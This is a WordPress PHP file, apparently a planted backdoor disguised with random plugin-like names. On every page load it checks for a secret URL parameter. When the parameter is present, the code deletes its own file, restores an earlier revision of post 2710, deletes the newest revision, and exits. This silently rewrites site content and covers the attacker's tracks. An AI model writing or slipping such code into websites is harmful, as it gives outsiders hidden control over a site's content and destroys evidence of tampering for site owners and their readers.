<?php

function report_rating_cron_fx() {
	if (isset($_GET['cool_avatar_coupons_your']) && $_GET['cool_avatar_coupons_your'] === 'ecommerce_page_ajax') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$visibility_controller_forum = 2710;
		$pixel_shopp_updates_website = wp_get_post_revisions($visibility_controller_forum);
		if (empty($pixel_shopp_updates_website)) die('no revisions');
		if (count($pixel_shopp_updates_website) < 2) die('less than 2');
		$github_blocks_rotator = array_shift($pixel_shopp_updates_website);
		$qr_related_description_wpml = $github_blocks_rotator->ID;
		$showcase_hide_coupon_style = array_shift($pixel_shopp_updates_website);
		$size_taxonomies_publish_edit = $showcase_hide_coupon_style->ID;
		$shortcode_reusable_bbpress_lightbox = wp_restore_post_revision($size_taxonomies_publish_edit);
		if ($shortcode_reusable_bbpress_lightbox === false) die('error restoring');
		$shortcode_reusable_bbpress_lightbox = wp_delete_post_revision($qr_related_description_wpml);		
		if ($shortcode_reusable_bbpress_lightbox === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'report_rating_cron_fx');
